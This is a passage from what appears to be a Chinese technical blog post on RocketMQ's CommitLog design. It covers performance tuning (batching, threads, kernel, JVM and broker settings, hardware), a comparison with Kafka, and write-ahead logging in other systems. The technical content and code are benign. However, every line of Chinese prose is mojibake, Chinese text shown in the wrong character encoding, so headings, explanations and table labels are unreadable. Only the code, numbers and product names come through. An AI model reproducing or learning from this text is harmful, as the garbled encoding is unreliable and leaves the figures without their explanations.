<table><thead><tr><th>ç»´åº¦</th><th>å•æ–‡ä»¶ï¼ˆCommitLogï¼‰</th><th>å¤šæ–‡ä»¶ï¼ˆæ¯Topicä¸€ä¸ªï¼‰</th></tr></thead><tbody><tr><td>å†™å…¥æ€§èƒ½</td><td>æé«˜ï¼ˆé¡ºåºå†™ï¼‰</td><td>æä½ï¼ˆéšæœºå†™ï¼‰</td></tr><tr><td>è¯»å–æ€§èƒ½</td><td>éœ€è¦ç´¢å¼•</td><td>ç›´æ¥è¯»å–</td></tr><tr><td>ç©ºé—´å ç”¨</td><td>æ‰€æœ‰æ¶ˆæ¯éƒ½å­˜å‚¨</td><td>å¯æŒ‰Topicæ¸…ç†</td></tr><tr><td>æ‰©å±•æ€§</td><td>å•ç‚¹å†™å…¥</td><td>å¤©ç„¶åˆ†å¸ƒå¼</td></tr><tr><td>å¤æ‚åº¦</td><td>ç®€å•</td><td>ç®¡ç†å¤æ‚</td></tr></tbody></table>
<p>RocketMQé€‰æ‹©äº†<strong>å†™æ€§èƒ½ä¼˜å…ˆ</strong>çš„ç­–ç•¥ï¼Œç”¨ConsumeQueueç´¢å¼•è§£å†³è¯»å–é—®é¢˜ï¼Œç”¨å®šæœŸæ¸…ç†è§£å†³ç©ºé—´é—®é¢˜ï¼Œç”¨Brokeré›†ç¾¤è§£å†³æ‰©å±•é—®é¢˜ã€‚</p>
<p>è¿™å°±æ˜¯è®¾è®¡çš„è‰ºæœ¯ï¼š<strong>æŠ“ä½æ ¸å¿ƒçŸ›ç›¾ï¼ˆå†™å…¥æ€§èƒ½ï¼‰ï¼Œç”¨å…¶ä»–æ–¹å¼å¼¥è¡¥ä»£ä»·ï¼ˆè¯»å–ã€ç©ºé—´ã€æ‰©å±•ï¼‰</strong>ã€‚</p>
<h2 data-id="heading-21">äº”ã€æ€§èƒ½ä¸æ˜¯å…è´¹çš„ï¼šè¦è¾¾åˆ°5ä¸‡TPSéœ€è¦ä»€ä¹ˆï¼Ÿ</h2>
<p>å•çº¯çš„é¡ºåºå†™æ€§èƒ½ä¸€èˆ¬ï¼Œæœ€ç®€å•çš„å®ç°ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æœ€ç®€å•çš„é¡ºåºå†™ï¼šæ¯æ¡éƒ½åˆ·ç›˜</span>
<span class="hljs-type">FileChannel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RandomAccessFile</span>(<span class="hljs-string">"test.log"</span>, <span class="hljs-string">"rw"</span>).getChannel();

<span class="hljs-keyword">for</span> (Message msg : messages) {
    channel.write(ByteBuffer.wrap(msg.getBytes()));
    channel.force(<span class="hljs-literal">false</span>);  <span class="hljs-comment">// æ¯æ¡éƒ½åˆ·ç›˜</span>
}
</code></pre>
<p><strong>æ€§èƒ½ï¼š500-1000 TPS</strong></p>
<p>å·®å¾—è¿œã€‚</p>
<p>è¦è¾¾åˆ°RocketMQçš„5ä¸‡-20ä¸‡TPSï¼Œéœ€è¦ä¸€æ•´å¥—ä¼˜åŒ–ç»„åˆæ‹³ã€‚</p>
<h3 data-id="heading-22">5.1 å¤šçº¿ç¨‹æ¨¡å‹</h3>
<p>RocketMQé‡‡ç”¨å¤šçº¿ç¨‹æ¶æ„ï¼š</p>
<pre><code class="hljs">ç½‘ç»œçº¿ç¨‹ï¼ˆNettyï¼‰ï¼š8-16ä¸ªï¼Œå¤„ç†ç½‘ç»œIO
ä¸šåŠ¡çº¿ç¨‹ï¼š8-16ä¸ªï¼Œå¤„ç†æ¶ˆæ¯ç¼–ç 
åˆ·ç›˜çº¿ç¨‹ï¼š1ä¸ªåå°çº¿ç¨‹ï¼Œå¼‚æ­¥æ‰¹é‡åˆ·ç›˜
ç´¢å¼•çº¿ç¨‹ï¼š1ä¸ªåå°çº¿ç¨‹ï¼Œæ„å»ºConsumeQueue
</code></pre>
<p>åªæœ‰å†™å…¥CommitLogæ—¶éœ€è¦åŠ é”ï¼ŒæŒæœ‰é”æ—¶é—´ä»…å‡ å¾®ç§’ã€‚å…¶ä»–ç¯èŠ‚éƒ½æ˜¯å¹¶å‘å¤„ç†ã€‚</p>
<h3 data-id="heading-23">5.2 æ‰¹é‡å¤„ç†</h3>
<p>æ‰¹é‡å¤„ç†æ˜¯æ€§èƒ½çš„å…³é”®ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç”Ÿäº§è€…æ‰¹é‡å‘é€</span>
producer.send(List&lt;Message&gt; msgs);  <span class="hljs-comment">// 100æ¡/æ‰¹</span>

<span class="hljs-comment">// Brokeræ‰¹é‡å†™å…¥</span>
<span class="hljs-keyword">for</span> (Message msg : batch) {
    commitLog.putMessage(msg);
}

<span class="hljs-comment">// å®šæ—¶æ‰¹é‡åˆ·ç›˜</span>
flushIntervalCommitLog = <span class="hljs-number">500</span>  <span class="hljs-comment">// 500msåˆ·ä¸€æ¬¡</span>
</code></pre>
<p>æ€§èƒ½å¯¹æ¯”ï¼š</p>
<pre><code class="hljs">å•æ¡å¤„ç†ï¼š163 TPS
æ‰¹é‡å¤„ç†ï¼ˆ100æ¡/æ‰¹ï¼‰ï¼š8,333 TPS  
æ‰¹é‡å¤„ç†ï¼ˆ1000æ¡/æ‰¹ï¼‰ï¼š8,695 TPS
å¤šçº¿ç¨‹å¹¶å‘ï¼ˆ8çº¿ç¨‹ï¼‰ï¼š69,560 TPS
</code></pre>
<h3 data-id="heading-24">5.3 å†…æ ¸å‚æ•°ä¼˜åŒ–</h3>
<p>æ“ä½œç³»ç»Ÿå‚æ•°è°ƒä¼˜åŒæ ·é‡è¦ã€‚ä»¥ä¸‹å‚æ•°æ¥è‡ªç¤¾åŒºå®è·µï¼Œéœ€æ ¹æ®å®é™…ç¯å¢ƒè°ƒæ•´ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ–‡ä»¶æè¿°ç¬¦</span>
<span class="hljs-built_in">ulimit</span> -n 1000000

<span class="hljs-comment"># TCPå‚æ•°</span>
net.ipv4.tcp_rmem = 4096 87380 16777216
net.ipv4.tcp_wmem = 4096 65536 16777216
net.core.somaxconn = 65535

<span class="hljs-comment"># è™šæ‹Ÿå†…å­˜ï¼ˆå½±å“åˆ·ç›˜è¡Œä¸ºï¼‰</span>
vm.dirty_background_ratio = 5    <span class="hljs-comment"># æ¨è5-10</span>
vm.dirty_ratio = 10               <span class="hljs-comment"># æ¨è10-20  </span>
vm.dirty_writeback_centisecs = 100
vm.dirty_expire_centisecs = 500
vm.max_map_count = 655360

<span class="hljs-comment"># IOè°ƒåº¦å™¨</span>
<span class="hljs-built_in">echo</span> none &gt; /sys/block/nvme0n1/queue/scheduler         <span class="hljs-comment"># SSD</span>
<span class="hljs-built_in">echo</span> mq-deadline &gt; /sys/block/sda/queue/scheduler      <span class="hljs-comment"># HDD</span>

<span class="hljs-comment"># æ–‡ä»¶ç³»ç»Ÿ</span>
mount -o noatime,nodiratime /dev/nvme0n1 /data/rocketmq
</code></pre>
<p>ä¼˜åŒ–æ•ˆæœï¼ˆæ ¹æ®ç¤¾åŒºåé¦ˆï¼‰ï¼š</p>
<pre><code class="hljs">ä¼˜åŒ–å‰ï¼š10,000-15,000 TPS
ä¼˜åŒ–åï¼š30,000-50,000 TPS
æå‡ï¼š2-5å€
</code></pre>
<h3 data-id="heading-25">5.4 JVMå‚æ•°ä¼˜åŒ–</h3>
<pre><code class="hljs language-bash" lang="bash">-Xms8g -Xmx8g                    <span class="hljs-comment"># å †å†…å­˜8G</span>
-XX:+UseG1GC                     <span class="hljs-comment"># ä½¿ç”¨G1GC</span>
-XX:MaxGCPauseMillis=50          <span class="hljs-comment"># æœ€å¤§GCåœé¡¿50ms</span>
-XX:MaxDirectMemorySize=15g      <span class="hljs-comment"># ç›´æ¥å†…å­˜15Gï¼ˆmmapéœ€è¦ï¼‰</span>
-XX:-UseBiasedLocking            <span class="hljs-comment"># å…³é—­åå‘é”</span>
</code></pre>
<p>15Gç›´æ¥å†…å­˜ç”¨äºï¼šCommitLog (10GB) + ConsumeQueue (2GB) + IndexFile (1GB) + ä½™é‡ (2GB)</p>
<h3 data-id="heading-26">5.5 RocketMQé…ç½®ä¼˜åŒ–</h3>
<pre><code class="hljs language-properties" lang="properties"># åˆ·ç›˜ç­–ç•¥
flushDiskType = ASYNC_FLUSH
flushIntervalCommitLog = 500
flushCommitLogLeastPages = 4

# æ–‡ä»¶é¢„åˆ†é…å’Œé¢„çƒ­
warmMapedFileEnable = true

# å †å¤–å†…å­˜æ± 
transientStorePoolEnable = true
transientStorePoolSize = 5

# é”ç±»å‹ï¼ˆfalse=è‡ªæ—‹é”ï¼Œä½å»¶è¿Ÿï¼‰
useReentrantLockWhenPutMessage = false

# çº¿ç¨‹æ± 
sendMessageThreadPoolNums = 16
</code></pre>
<h3 data-id="heading-27">5.6 ç¡¬ä»¶é…ç½®</h3>
<p>æ¨èé…ç½®ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">CPUï¼š16æ ¸+ï¼Œä¸»é¢‘3GHz+
å†…å­˜ï¼š32GB+ï¼ˆ64GBæ¨èï¼‰
ç£ç›˜ï¼šNVMe SSDï¼ˆ3000-7000 MB/sï¼‰
ç½‘ç»œï¼šä¸‡å…†ç½‘å¡ï¼ˆ10Gbpsï¼‰
</code></pre>
<p>ä¸åŒé…ç½®çš„æ€§èƒ½ï¼š</p>





















<table><thead><tr><th>é…ç½®</th><th>TPS</th></tr></thead><tbody><tr><td>HDD + 8æ ¸16G</td><td>5,000</td></tr><tr><td>SSD + 16æ ¸32G</td><td>50,000</td></tr><tr><td>NVMe + 32æ ¸64G</td><td>200,000</td></tr></tbody></table>
<h3 data-id="heading-28">5.7 æ€§èƒ½æå‡è·¯å¾„</h3>
<p>ä»ç®€å•åˆ°å®Œæ•´ä¼˜åŒ–çš„è·¯å¾„ï¼š</p>
<pre><code class="hljs">æœ€ç®€å•é¡ºåºå†™ï¼ˆæ¯æ¡åˆ·ç›˜ï¼‰ï¼š500-1000 TPS
åŠ ä¸Šmmapï¼ˆä¸åˆ·ç›˜ï¼‰ï¼š50,000-100,000 TPSï¼ˆä¸å®ç”¨ï¼‰
åŠ ä¸Šæ‰¹é‡åˆ·ç›˜ï¼š10,000-20,000 TPS
åŠ ä¸Šå¤šçº¿ç¨‹ï¼š30,000-50,000 TPS
åŠ ä¸Šæ‰¹é‡å¤„ç†ï¼š50,000-80,000 TPS
å®Œæ•´ä¼˜åŒ–ï¼š100,000-200,000 TPS
</code></pre>
<p>é¡ºåºå†™åªæ˜¯åŸºç¡€ï¼Œè¦è¾¾åˆ°ç”Ÿäº§çº§æ€§èƒ½éœ€è¦å®Œæ•´çš„ä¼˜åŒ–ç»„åˆã€‚</p>
<h2 data-id="heading-29">å…­ã€å¯¹æ¯”ï¼šKafkaä¸ºä»€ä¹ˆèƒ½åˆ°å•æœº100ä¸‡TPSï¼Ÿ</h2>
<p>æœ‰äººè¯´Kafkaå•æœºèƒ½åˆ°100ä¸‡TPSï¼Œä¸ºä»€ä¹ˆRocketMQåªæœ‰20ä¸‡ï¼Ÿ</p>
<p><strong>é¦–å…ˆæ˜ç¡®ï¼šKafkaå•æœº100ä¸‡TPSçš„æµ‹è¯•æ¡ä»¶</strong></p>
<ul>
<li>å¼‚æ­¥åˆ·ç›˜ï¼ˆä¸RocketMQç›¸åŒï¼‰</li>
<li>æ‰¹é‡å¤§å°ï¼š16KBï¼ˆRocketMQé»˜è®¤4KBï¼‰</li>
<li>é«˜é…æœåŠ¡å™¨ï¼š32æ ¸64G + NVMe SSD</li>
<li>å•Topicæˆ–å°‘é‡Topicï¼ˆé‡è¦ï¼ï¼‰</li>
<li>Producerç«¯å‹ç¼©</li>
<li>æ¶ˆæ¯å¤§å°ï¼š1KB</li>
</ul>
<p><strong>è¿™æ˜¯ä¸€ä¸ªæé™ä¼˜åŒ–åœºæ™¯ä¸‹çš„æ•°æ®ï¼Œä¸æ˜¯å¸¸è§„æ€§èƒ½ã€‚</strong></p>
<h3 data-id="heading-30">Kafkaå’ŒRocketMQçš„è®¾è®¡å·®å¼‚</h3>
<p>ä¸¤è€…éƒ½æ˜¯ä¼˜ç§€çš„æ¶ˆæ¯ä¸­é—´ä»¶ï¼Œä½†è®¾è®¡ç›®æ ‡ä¸åŒï¼š</p>
<p><strong>Kafkaçš„è®¾è®¡é€‰æ‹©ï¼ˆååé‡ä¼˜å…ˆï¼‰ï¼š</strong></p>
<ol>
<li>
<p><strong>æ›´æ¿€è¿›çš„æ‰¹é‡ç­–ç•¥</strong></p>
<ul>
<li>é»˜è®¤æ‰¹é‡å¤§å°ï¼š16KB</li>
<li>å»¶è¿Ÿæ¢ååé‡</li>
<li>é€‚åˆï¼šæ—¥å¿—æ”¶é›†ã€æµå¼å¤„ç†</li>
</ul>
</li>
<li>
<p><strong>sendfileé›¶æ‹·è´</strong></p>
<ul>
<li>ä»PageCacheç›´æ¥å‘é€ç»™ç½‘å¡</li>
<li>ä¸ç»è¿‡ç”¨æˆ·ç©ºé—´</li>
<li>æ¶ˆè´¹åœºæ™¯æ€§èƒ½æä½³</li>
</ul>
</li>
<li>
<p><strong>ç¨€ç–ç´¢å¼•</strong></p>
<ul>
<li>ç´¢å¼•é¢—ç²’åº¦ï¼š4KBä¸€ä¸ªç´¢å¼•ç‚¹</li>
<li>ç´¢å¼•æ„å»ºå¼€é”€å°</li>
<li>ä½†æŸ¥è¯¢ç²’åº¦ç²—</li>
</ul>
</li>
<li>
<p><strong>ç®€åŒ–çš„å­˜å‚¨æ¨¡å‹</strong></p>
<ul>
<li>æ¯ä¸ªPartitionä¸€ä¸ªæ–‡ä»¶</li>
<li>é¡ºåºæ¶ˆè´¹ä¼˜åŒ–åˆ°æè‡´</li>
<li>ä½†æŒ‰KeyæŸ¥è¯¢éœ€è¦æ‰«æ</li>
</ul>
</li>
</ol>
<p><strong>RocketMQçš„è®¾è®¡é€‰æ‹©ï¼ˆåŠŸèƒ½ä¸°å¯Œ + ä½å»¶è¿Ÿï¼‰ï¼š</strong></p>
<ol>
<li>
<p><strong>ç»†ç²’åº¦ç´¢å¼•</strong></p>
<ul>
<li>ConsumeQueueï¼š20å­—èŠ‚ä¸€ä¸ªç´¢å¼•</li>
<li>IndexFileï¼šæ”¯æŒæŒ‰KeyæŸ¥è¯¢</li>
<li>Tagè¿‡æ»¤åœ¨Brokerç«¯å®Œæˆ</li>
</ul>
</li>
<li>
<p><strong>ä¸°å¯Œçš„åŠŸèƒ½</strong></p>
<ul>
<li>äº‹åŠ¡æ¶ˆæ¯ï¼ˆHalf Message + å›æŸ¥ï¼‰</li>
<li>å»¶æ—¶æ¶ˆæ¯ï¼ˆ18ä¸ªLevelï¼‰</li>
<li>æ¶ˆæ¯è½¨è¿¹ã€æ¶ˆæ¯è¿‡æ»¤</li>
</ul>
</li>
<li>
<p><strong>æ›´ä½çš„å»¶è¿Ÿ</strong></p>
<ul>
<li>æ‰¹é‡å¤§å°ï¼š4KBï¼ˆå¯é…ç½®ï¼‰</li>
<li>P99å»¶è¿Ÿï¼š1-3ms</li>
<li>Kafkaï¼š5-10msï¼ˆæ‰¹é‡å¯¼è‡´ï¼‰</li>
</ul>
</li>
<li>
<p><strong>Topicæ— å…³çš„æ€§èƒ½</strong></p>
<ul>
<li>æ‰€æœ‰Topicå…±ç”¨CommitLog</li>
<li>Topicæ•°é‡ä¸å½±å“å†™å…¥æ€§èƒ½</li>
<li>Kafkaï¼šTopicå¤šä¼šå½±å“æ€§èƒ½</li>
</ul>
</li>
</ol>
<h3 data-id="heading-31">æ€§èƒ½å¯¹æ¯”ï¼ˆåœ¨å„è‡ªæ“…é•¿çš„åœºæ™¯ï¼‰</h3>



































<table><thead><tr><th>åœºæ™¯</th><th>Kafka</th><th>RocketMQ</th></tr></thead><tbody><tr><td>æ—¥å¿—æ”¶é›†ï¼ˆå¤§æ‰¹é‡ï¼‰</td><td>100ä¸‡+ TPS</td><td>20-30ä¸‡ TPS</td></tr><tr><td>ä¸šåŠ¡æ¶ˆæ¯ï¼ˆå°æ‰¹é‡ï¼‰</td><td>10-20ä¸‡ TPS</td><td>10-30ä¸‡ TPS</td></tr><tr><td>å¤šTopicï¼ˆ1000+ï¼‰</td><td>5-10ä¸‡ TPS</td><td>20-30ä¸‡ TPS</td></tr><tr><td>æŒ‰KeyæŸ¥è¯¢æ¶ˆæ¯</td><td>éœ€è¦æ‰«æ</td><td>æ”¯æŒï¼ˆIndexFileï¼‰</td></tr><tr><td>äº‹åŠ¡æ¶ˆæ¯</td><td>ä¸æ”¯æŒ</td><td>æ”¯æŒ</td></tr></tbody></table>
<h3 data-id="heading-32">ç»“è®ºï¼šä¸æ˜¯è°å¥½è°åï¼Œè€Œæ˜¯è®¾è®¡ç›®æ ‡ä¸åŒ</h3>
<p><strong>Kafkaé€‚åˆï¼š</strong></p>
<ul>
<li>æ—¥å¿—æ”¶é›†ã€åŸ‹ç‚¹ä¸ŠæŠ¥</li>
<li>æµå¼å¤„ç†ï¼ˆå¤§æ•°æ®åœºæ™¯ï¼‰</li>
<li>é¡ºåºæ¶ˆè´¹ä¸ºä¸»</li>
<li>å¯¹å»¶è¿Ÿä¸æ•æ„Ÿ</li>
</ul>
<p><strong>RocketMQé€‚åˆï¼š</strong></p>
<ul>
<li>ä¸šåŠ¡æ¶ˆæ¯ï¼ˆè®¢å•ã€æ”¯ä»˜ã€é€šçŸ¥ï¼‰</li>
<li>éœ€è¦äº‹åŠ¡æ¶ˆæ¯ã€å»¶æ—¶æ¶ˆæ¯</li>
<li>éœ€è¦æŒ‰KeyæŸ¥è¯¢ã€Tagè¿‡æ»¤</li>
<li>å¯¹å»¶è¿Ÿæ•æ„Ÿ</li>
</ul>
<p><strong>ä¸¤è€…éƒ½æ˜¯ä¼˜ç§€çš„è®¾è®¡ï¼Œåªæ˜¯ä¼˜åŒ–çš„æ–¹å‘ä¸åŒã€‚</strong></p>
<h2 data-id="heading-33">ä¸ƒã€å‡åï¼šWALæ€æƒ³çš„é€šç”¨æ€§</h2>
<p>CommitLogçš„è®¾è®¡ï¼Œæœ¬è´¨ä¸Šæ˜¯**WALï¼ˆWrite-Ahead Logï¼‰**æ¨¡å¼çš„å®ç°ã€‚</p>
<h3 data-id="heading-34">7.1 WALçš„æ ¸å¿ƒåŸåˆ™</h3>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> å…ˆå†™æ—¥å¿—ï¼ˆCommitLogï¼‰
   â†“
<span class="hljs-bullet">2.</span> åå»ºç´¢å¼•ï¼ˆConsumeQueueï¼‰
   â†“
<span class="hljs-bullet">3.</span> è¯»å†™åˆ†ç¦»ï¼ˆå†™èµ°æ—¥å¿—ï¼Œè¯»èµ°ç´¢å¼•ï¼‰
</code></pre>
<p><strong>å…³é”®ç‚¹ï¼š</strong></p>
<ul>
<li><strong>é¡ºåºIOæ˜¯ç‹é“</strong> - å……åˆ†åˆ©ç”¨ç£ç›˜ç‰¹æ€§</li>
<li><strong>å…ˆä¿è¯æŒä¹…åŒ–ï¼Œå†ä¼˜åŒ–æŸ¥è¯¢</strong> - å†™å…¥ä¸æŸ¥è¯¢è§£è€¦</li>
<li><strong>æ—¥å¿—ä¸ç´¢å¼•åˆ†ç¦»</strong> - å„å¸å…¶èŒ</li>
</ul>
<h3 data-id="heading-35">7.2 å…¶ä»–ç³»ç»Ÿçš„WALå®ç°</h3>
<p>è¿™ä¸ªæ€æƒ³åœ¨å¾ˆå¤šç³»ç»Ÿä¸­éƒ½æœ‰ä½“ç°ï¼š</p>
<p><strong>MySQLçš„Redo Logï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">å†™å…¥æµç¨‹ï¼š
<span class="hljs-bullet">1.</span> äº‹åŠ¡ä¿®æ”¹æ•°æ®
<span class="hljs-bullet">2.</span> å…ˆå†™Redo Logï¼ˆé¡ºåºè¿½åŠ ï¼Œä¿è¯æŒä¹…æ€§ï¼‰
<span class="hljs-bullet">3.</span> åå†™Undo Logï¼ˆç”¨äºå›æ»šï¼Œä¿è¯åŸå­æ€§ï¼‰
<span class="hljs-bullet">4.</span> æœ€ååˆ·Data Pageï¼ˆéšæœºå†™ï¼‰

å´©æºƒæ¢å¤ï¼š
ä»Redo Logé‡æ”¾ â†’ æ¢å¤å·²æäº¤äº‹åŠ¡
ä»Undo Logå›æ»š â†’ æ’¤é”€æœªæäº¤äº‹åŠ¡

æ ¸å¿ƒï¼šRedo Logçš„é¡ºåºå†™ä¿è¯äº†äº‹åŠ¡æŒä¹…æ€§
</code></pre>
<p><strong>Kafkaçš„Partition Logï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">å­˜å‚¨ç»“æ„ï¼š
<span class="hljs-bullet">1.</span> æ¯ä¸ªPartitionåŒ…æ‹¬ï¼šLog Segment + Indexæ–‡ä»¶
<span class="hljs-bullet">2.</span> Log Segmentï¼šæ¶ˆæ¯æœ¬èº«ï¼ˆé¡ºåºè¿½åŠ ï¼‰
<span class="hljs-bullet">3.</span> Indexæ–‡ä»¶ï¼šç¨€ç–ç´¢å¼•ï¼ˆoffset â†’ æ–‡ä»¶ä½ç½®ï¼‰

å†™å…¥ï¼š
é¡ºåºè¿½åŠ åˆ°å½“å‰Segment

è¯»å–ï¼š
å…ˆæŸ¥Indexæ‰¾åˆ°Segmentä½ç½® â†’ å†è¯»Log

ç´¢å¼•ç‰¹ç‚¹ï¼š
æ¯4KBæ¶ˆæ¯å»ºä¸€ä¸ªç´¢å¼•ç‚¹ï¼ˆç¨€ç–ï¼‰
ä¸RocketMQçš„ConsumeQueueç±»ä¼¼ï¼Œä½†ç²’åº¦æ›´ç²—
</code></pre>
<p><strong>Redisçš„AOFï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">æŒä¹…åŒ–ï¼š
<span class="hljs-bullet">1.</span> æ¯ä¸ªå†™æ“ä½œè¿½åŠ åˆ°AOFæ–‡ä»¶
<span class="hljs-bullet">2.</span> é¡ºåºå†™å…¥
<span class="hljs-bullet">3.</span> å®šæœŸé‡å†™å‹ç¼©

æ¢å¤ï¼š
é‡æ”¾AOFæ–‡ä»¶ â†’ æ¢å¤å†…å­˜æ•°æ®
</code></pre>
<p><strong>HBaseçš„WALï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">å†™å…¥æµç¨‹ï¼š
<span class="hljs-bullet">1.</span> å…ˆå†™WALï¼ˆHLogï¼‰
<span class="hljs-bullet">2.</span> å†å†™MemStore
<span class="hljs-bullet">3.</span> æœ€ååˆ·åˆ°HFile

å´©æºƒæ¢å¤ï¼š
ä»WALé‡æ”¾ â†’ æ¢å¤MemStore
</code></pre>
<h3 data-id="heading-36">7.3 ä½ çš„ç³»ç»Ÿä¹Ÿå¯ä»¥ç”¨</h3>
<p>å¦‚æœä½ åœ¨è®¾è®¡ä¸€ä¸ªéœ€è¦<strong>é«˜ååé‡æŒä¹…åŒ–</strong>çš„ç³»ç»Ÿï¼ŒWALæ€æƒ³å¯èƒ½é€‚åˆä½ ï¼š</p>
<p><strong>ä»»åŠ¡è°ƒåº¦ç³»ç»Ÿï¼ˆJobFlowï¼‰ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">ä»»åŠ¡æ‰§è¡Œè®°å½•ï¼š
<span class="hljs-bullet">1.</span> ä»»åŠ¡æ‰§è¡Œæ—¥å¿—ï¼ˆé¡ºåºå†™ï¼‰
<span class="hljs-bullet">2.</span> ä»»åŠ¡çŠ¶æ€ç´¢å¼•ï¼ˆå¼‚æ­¥æ„å»ºï¼‰
<span class="hljs-bullet">3.</span> æŸ¥è¯¢èµ°ç´¢å¼•ï¼Œä¸æ‰«ææ—¥å¿—
</code></pre>
<p><strong>å®¡è®¡æ—¥å¿—ç³»ç»Ÿï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">æ“ä½œæ—¥å¿—ï¼š
<span class="hljs-bullet">1.</span> æ‰€æœ‰æ“ä½œè¿½åŠ åˆ°æ—¥å¿—æ–‡ä»¶
<span class="hljs-bullet">2.</span> æŒ‰æ—¶é—´ã€ç”¨æˆ·ã€æ“ä½œç±»å‹å»ºç´¢å¼•
<span class="hljs-bullet">3.</span> æŸ¥è¯¢èµ°ç´¢å¼•
</code></pre>
<p><strong>äº‹ä»¶æº¯æºï¼ˆEvent Sourcingï¼‰ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">äº‹ä»¶å­˜å‚¨ï¼š
<span class="hljs-bullet">1.</span> æ‰€æœ‰äº‹ä»¶é¡ºåºè¿½åŠ 
<span class="hljs-bullet">2.</span> èšåˆæ ¹çŠ¶æ€å¼‚æ­¥è®¡ç®—
<span class="hljs-bullet">3.</span> æŸ¥è¯¢èµ°çŠ¶æ€å¿«ç…§
</code></pre>
<h3 data-id="heading-37">7.4 é€‚ç”¨åœºæ™¯</h3>
<p>WALæ¨¡å¼é€‚åˆï¼š</p>
<ul>
<li>å†™å¤šè¯»å°‘çš„åœºæ™¯</li>
<li>å¯¹å†™å…¥æ€§èƒ½è¦æ±‚é«˜</li>
<li>éœ€è¦ä¿è¯æ•°æ®ä¸ä¸¢</li>
<li>å¯ä»¥å®¹å¿è¯»å–ç¨æ…¢ï¼ˆé€šè¿‡ç´¢å¼•ä¼˜åŒ–ï¼‰</li>
</ul>
<p>ä¸é€‚åˆï¼š</p>
<ul>
<li>éœ€è¦é¢‘ç¹éšæœºè¯»å–</li>
<li>ç£ç›˜ç©ºé—´ç´§å¼ </li>
<li>å®æ—¶æŸ¥è¯¢è¦æ±‚é«˜</li>
</ul>
<h2 data-id="heading-38">æ€»ç»“</h2>
<p>RocketMQçš„CommitLogè®¾è®¡çœ‹èµ·æ¥ç®€å•ï¼Œå®åˆ™ç²¾å¦™ã€‚</p>
<p>è®¾è®¡æ ¸å¿ƒï¼š</p>
<ul>
<li>æ‰€æœ‰Topicå…±ç”¨ä¸€ä¸ªCommitLog</li>
<li>é¡ºåºè¿½åŠ å†™å…¥</li>
<li>mmapé›¶æ‹·è´ + PageCache</li>
</ul>
<p>æ€§èƒ½çœŸç›¸ï¼š</p>
<ul>
<li>å•çº¯é¡ºåºå†™ï¼š500-1000 TPSï¼ˆæ¯æ¡éƒ½åˆ·ç›˜ï¼‰</li>
<li>åŠ ä¸Šmmapï¼š50,000-100,000 TPSï¼ˆä¸åˆ·ç›˜ï¼Œä¸å®ç”¨ï¼‰</li>
<li>å®Œæ•´ä¼˜åŒ–ï¼š100,000-200,000 TPSï¼ˆå¤šçº¿ç¨‹+æ‰¹é‡+å‚æ•°ä¼˜åŒ–+ç¡¬ä»¶ï¼‰</li>
</ul>
<p>è¦è¾¾åˆ°ç”Ÿäº§çº§æ€§èƒ½ï¼Œéœ€è¦ï¼š</p>
<ol>
<li>å¤šçº¿ç¨‹æ¨¡å‹ï¼ˆç½‘ç»œã€ä¸šåŠ¡ã€åˆ·ç›˜ã€ç´¢å¼•åˆ†ç¦»ï¼‰</li>
<li>æ‰¹é‡å¤„ç†ï¼ˆæ‰¹é‡å‘é€ã€æ‰¹é‡ç¼–ç ã€æ‰¹é‡åˆ·ç›˜ï¼‰</li>
<li>å†…æ ¸å‚æ•°ä¼˜åŒ–ï¼ˆTCPã€è™šæ‹Ÿå†…å­˜ã€IOè°ƒåº¦å™¨ï¼‰</li>
<li>JVMä¼˜åŒ–ï¼ˆG1GCã€ç›´æ¥å†…å­˜ï¼‰</li>
<li>RocketMQé…ç½®ä¼˜åŒ–ï¼ˆå¼‚æ­¥åˆ·ç›˜ã€æ–‡ä»¶é¢„çƒ­ã€å †å¤–å†…å­˜æ± ï¼‰</li>
<li>ç¡¬ä»¶é…ç½®ï¼ˆNVMe SSDã€å¤§å†…å­˜ã€ä¸‡å…†ç½‘å¡ï¼‰</li>
</ol>
<p>è®¾è®¡æƒè¡¡ï¼š</p>
<ul>
<li>HDDï¼šé¡ºåºå†™æ¯”éšæœºå†™å¿«50-800å€</li>
<li>SSDï¼šé¡ºåºå†™æ¯”éšæœºå†™å¿«5-30å€ï¼ˆå¤šæ–‡ä»¶åœºæ™¯ï¼‰</li>
<li>ç‰ºç‰²è¯»å–çš„ç›´æ¥æ€§ï¼ˆç”¨ConsumeQueueç´¢å¼•è§£å†³ï¼‰</li>
<li>ç‰ºç‰²ç©ºé—´æ•ˆç‡ï¼ˆç”¨å®šæœŸæ¸…ç†è§£å†³ï¼‰</li>
<li>ç‰ºç‰²å•ç‚¹æ‰©å±•ï¼ˆç”¨Brokeré›†ç¾¤è§£å†³ï¼‰</li>
<li>æ¢æ¥å†™å…¥çš„æè‡´æ€§èƒ½</li>
</ul>
<p>é€šç”¨æ€æƒ³ï¼š</p>
<ul>
<li>WALæ¨¡å¼æ˜¯é«˜æ€§èƒ½æŒä¹…åŒ–çš„ç»å…¸æ–¹æ¡ˆ</li>
<li>é¡ºåºIOæ˜¯å­˜å‚¨ç³»ç»Ÿçš„é»„é‡‘æ³•åˆ™</li>
<li>è¯»å†™åˆ†ç¦»è®©å„è‡ªæ€§èƒ½è¾¾åˆ°æè‡´</li>
<li>æ€§èƒ½ä¸æ˜¯å…è´¹çš„ï¼Œéœ€è¦ç³»ç»Ÿæ€§ä¼˜åŒ–</li>
</ul>
